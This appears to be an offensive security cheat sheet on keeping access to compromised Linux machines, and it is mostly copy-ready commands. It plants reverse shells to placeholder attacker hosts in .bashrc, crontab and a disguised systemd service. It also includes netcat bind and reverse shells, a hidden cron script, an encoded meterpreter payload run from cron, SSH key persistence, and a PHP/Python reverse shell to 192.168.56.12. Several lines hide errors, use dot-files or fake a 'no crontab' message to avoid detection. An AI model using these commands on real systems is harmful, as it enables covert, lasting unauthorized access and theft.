# linux persistance

anytime you have a remote shell, remember to background it and run *stty raw -echo* so the terminal will not echo special character and pass them through the shell (when you type *fg*, it will not echo to screen). You can also use *stty -a* on the attack machine to see your rows and columns and set them to the same thing on the remote box with *stty rows* and *stty cols* respectively

## tools

[linper](https://github.com/montysecurity/linper)

## bashrc

- executed everytime bash is initialized for the given user

`echo "bash -c 'bash -i > /dev/tcp/RHOST/RPORT 2>&1 0>&1' 2> /dev/null 1>&2 & sleep .0001" >> ~/.bashrc`

## crontab

`crontab -l > /tmp/tmp.cgL8qKGk4U && echo "* * * * * bash -c 'bash -i > /dev/tcp/RHOST/RPORT 2>&1 0>&1'" >> /tmp/tmp.cgL8qKGk4U; crontab /tmp/tmp.cgL8qKGk4U && rm /tmp/tmp.cgL8qKGk4U`

`echo -e "* * * * * echo task\rno crontab for $USER" | crontab`

## systemctl

```
echo "bash -c 'bash -i > /dev/tcp/RHOST/RPORT 2>&1 0>&1'" >> /etc/systemd/system/Tb8lKOKxGP.sh

if test -f /etc/systemd/system/M8JmWQM9fr.service;
then
	echo > /dev/null
else
	touch /etc/systemd/system/M8JmWQM9fr.service
	echo "[Service]" >> /etc/systemd/system/M8JmWQM9fr.service
	echo "Type=oneshot" >> /etc/systemd/system/M8JmWQM9fr.service
	echo "ExecStartPre=/usr/bin/sleep 60" >> /etc/systemd/system/M8JmWQM9fr.service
	echo "ExecStart=/bin/bash /etc/systemd/system/Tb8lKOKxGP.sh" >> /etc/systemd/system/M8JmWQM9fr.service
	echo "ExecStartPost=/usr/bin/sleep infinity" >> /etc/systemd/system/M8JmWQM9fr.service
	echo "[Install]" >> /etc/systemd/system/M8JmWQM9fr.service
	echo "WantedBy=multi-user.target" >> /etc/systemd/system/M8JmWQM9fr.service
	chmod 644 /etc/systemd/system/M8JmWQM9fr.service
	systemctl start M8JmWQM9fr.service 2> /dev/null & sleep .0001
	systemctl enable M8JmWQM9fr.service 2> /dev/null & sleep .0001
fi
```

## directories
everything in /etc/init and /etc/init.d/ is ran at startup

/etc/rc.local is a pre-init file that will also work on BSD and Linux, the file has to start with "/bin/bash -e" and end with "exit 0"

## netcat and bashrc
### reverse shell
Put reverse shell in targets bashrc and despite success or fail, it returns no error to screen and gives the user their bash shell upon initilization
	
	On Target Box
		echo "nc attackBox attackPort -e /bin/bash 2> /dev/null & sleep .0001" > ~/.bashrc
	On Attack Box
		nc -lnvp attackPort

### bind shell
Same idea as above, only it's a bind shell, not a reverse shell

	On Target Box
		echo "nc -lnvp attackPort -e /bin/bash 2> /dev/null & sleep .0001" > ~/.bashrc
	On Attack Box
		nc attackBox attackPort

## bash and cron
The less dependencies the better. Since Linux treats socket connections as files, you can redirect the bash terminal's interactive capabilities to a *file* that is really just a socket connection
	
	On Target Box
		echo "echo 'bash -i >& /dev/tcp/attackBox/attackPort 0>&1 | bash'" > /var/tmp/.cron.sh && chmod +x /var/tmp/.cron.sh && echo "* * * * * cd /var/tmp && ./.cron.sh" > cronjobtmp.sh && crontab cronjobtmp.sh && rm cronjobtmp.sh
	On Attack Box
		nc -lnvp attackPort

## metasploit and cron
If you prefer to use msfconsole to make post exploitation a bit easier, below is a one-liner for creating the payload and handler

	On Attack Box
		sudo service postgresql restart && msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf -e x86/shikata_ga_nai -i 5 LHOST=attackBox LPORT=attackPort -o mal.elf && msfconsole -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST attackBox; set LPORT attackPort; exploit"

	On Target Box
		nc -lnvp $port > /home/.mal.elf && chmod +x /home/.mal.elf
	
	On Attack Box
		nc $target $port < mal.elf

	On Target Box
		echo "* * * * * cd /home/ && ./.mal.elf" > .cron && crontab .cron && shred .cron; rm .cron

## metasploit and ssh
You need to already have a meterpreter session to follow along
	
	In Meterpreter
		use post/linux/manage/sshkey_persistence
		set fields
		run
		
	On Attack Box
		chmod 600 $ssh_key.txt (created by module)
		ssh -i $ssh_key.txt user@target

## php and python
If you have write access to a php file on the target and the target has python installed, you can use the following for a reverse shell

	In PHP file
		<?php system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.12",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''); ?>
	On Attack Box
		nc -lnvp 5555

Suggest stacking persistence, as a wise man once said
> Two is one, one is none - Mubix
